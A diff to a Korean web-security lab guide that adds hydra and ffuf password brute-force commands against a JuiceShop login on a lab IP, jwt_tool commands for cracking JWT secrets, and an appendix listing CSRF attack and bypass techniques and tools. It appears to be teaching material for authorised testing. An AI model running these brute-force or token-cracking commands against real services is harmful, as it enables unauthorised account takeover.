@@ -219,6 +219,29 @@ done
 # 429 (Too Many Requests)가 나오면 Rate Limiting 존재
 ```
 
+**OSS 도구 — hydra (실무 표준 brute-force)**:
+```bash
+# hydra 설치 (이미 설치됨)
+sudo apt install hydra
+
+# JuiceShop 로그인 brute-force (HTTP POST JSON)
+# wordlist 준비
+echo -e "admin\nadmin123\npassword\njuice\n12345678\nadmin1234" > /tmp/pwd.txt
+
+# hydra 로 자동 brute (json body 형식, 실패 키워드 'invalid')
+hydra -l admin@juice-sh.op -P /tmp/pwd.txt 10.20.30.80 -s 3000 \
+  http-post-form '/rest/user/login:{"email":"^USER^","password":"^PASS^"}:invalid' \
+  -V -t 4
+
+# 또는 ffuf 로 (인증 fuzz)
+ffuf -w /tmp/pwd.txt -X POST -u http://10.20.30.80:3000/rest/user/login \
+  -H "Content-Type: application/json" \
+  -d '{"email":"admin@juice-sh.op","password":"FUZZ"}' \
+  -mc all -fs 50            # 응답 크기 50B (fail 응답) 제외
+```
+
+**도구의 이점**: (1) `-t` 멀티스레드, (2) `-V` 실패/성공 자동 구분, (3) 다양한 프로토콜 지원 (SSH/FTP/SMB/HTTP-FORM/HTTP-POST 등). curl + bash for-loop 은 학습용, 실제는 hydra/medusa/ffuf 사용.
+
 ### 3.4 기본 계정 점검
 
 반복문으로 여러 대상에 대해 일괄 작업을 수행합니다.
@@ -348,6 +371,24 @@ echo ""
 echo "=== Payload ==="
 echo "$TOKEN" | cut -d'.' -f2 | python3 -c "import sys,base64,json; s=sys.stdin.read().strip(); s+='='*(4-len(s)%4); print(json.dumps(json.loads(base64.urlsafe_b64decode(s)),indent=2))"
 ```
+
+**OSS 도구 — jwt_tool (JWT 점검 표준)**:
+```bash
+# jwt_tool 설치 (이미 설치됨)
+git clone https://github.com/ticarpi/jwt_tool.git ~/jwt_tool 2>/dev/null
+cd ~/jwt_tool && pip3 install -r requirements.txt
+
+# JWT 디코딩 (1 명령으로 header + payload + sig)
+python3 ~/jwt_tool/jwt_tool.py "$TOKEN"
+
+# JWT 자동 약점 진단 (none/weak HMAC/key confusion 등)
+python3 ~/jwt_tool/jwt_tool.py "$TOKEN" -T
+
+# secret brute-force (HS256)
+python3 ~/jwt_tool/jwt_tool.py "$TOKEN" -C -d /usr/share/wordlists/rockyou.txt
+```
+
+**대안 — 온라인 디코더**: jwt.io 도 사용 가능하지만 **민감한 토큰을 외부 사이트에 붙여넣지 말 것** (점검 윤리 위반).
 
 ### 5.3 JWT 취약점 점검
 
@@ -591,3 +632,34 @@ print(f'전체 payload: {json.dumps(payload, indent=2)}')
 3. Top user (USER-0022 6,190회) 같은 *high-volume* 계정의 자동화 여부 (서비스 계정 vs 사람 계정) 분류
 
 
+
+
+---
+
+## 부록: 학습 OSS 도구 매트릭스 (lab week04 — CSRF)
+
+| step | 카테고리 | 핵심 도구 |
+|---|---|---|
+| 1 csrf_detect | curl + grep / **Burp Generate CSRF PoC** / OWASP ZAP / nuclei csrf-detect / Python BS auto |
+| 2 csrf_craft form | auto-submit form / Burp PoC / **csrfgenerator.com** / pycsrf / iframe·image 변형 |
+| 3 csrf_craft GET | img/iframe/link prefetch/video/CSS bg / Burp / curl 사전 검증 |
+| 4 csrf_craft AJAX | fetch credentials:include / XHR legacy / **CORS simple request 조건** / Content-Type 우회 |
+| 5 csrf_defense SameSite | curl + grep / **SameSite 3 모드 표** / DevTools Application / Python http.server |
+| 6 csrf_bypass token | curl 8 패턴 / **Burp Sequencer entropy** / OWASP ZAP CSRF Tester |
+| 7 csrf_bypass referer | curl 빈 Referer / meta no-referrer / **substring 우회** / Burp Repeater |
+| 8 csrf_advanced JSON | curl Content-Type 4 종 / **enctype=text/plain 트릭** / Burp Active Scan / nuclei csrf,cors |
+| 9 csrf_advanced CORS | curl -H Origin 변조 / **CORScanner** / **Corsy 13 패턴** / ACAO+ACAC 분석 |
+| 10 csrf+xss chain | XSS payload + 토큰 추출 + fetch chain / **BeEF Ajax Fingerprint** / XSStrike custom / Burp Macro |
+| 11 csrf_defense double-submit | 3 단계 (cookie+header+match) / curl 검증 / __Host- prefix / **Synchronizer Token Pattern** |
+| 12 csrf_defense framework | **7 프레임워크 비교표** / curl + grep / semgrep p/csrf / npm audit |
+| 13 csrf_tool auto | Python BS / **OWASP ZAP** / Burp Active Scan / nuclei / CI/CD GitHub Actions |
+| 14 csrf_defense 권고 | **5층 방어** / Mozilla Observatory / Spring/Django/Express 설정 코드 |
+| 15 verification | 자동 보고서 / **DefectDojo** / sha256 / 윤리 footer |
+
+### 학생 환경 준비
+```bash
+pip install corscanner
+git clone --depth 1 https://github.com/s0md3v/Corsy ~/Corsy
+# Burp Suite Community 다운로드 (CSRF PoC Generator 내장)
+# Spring Security / Django CsrfViewMiddleware / Express csurf 는 코드 통합
+```
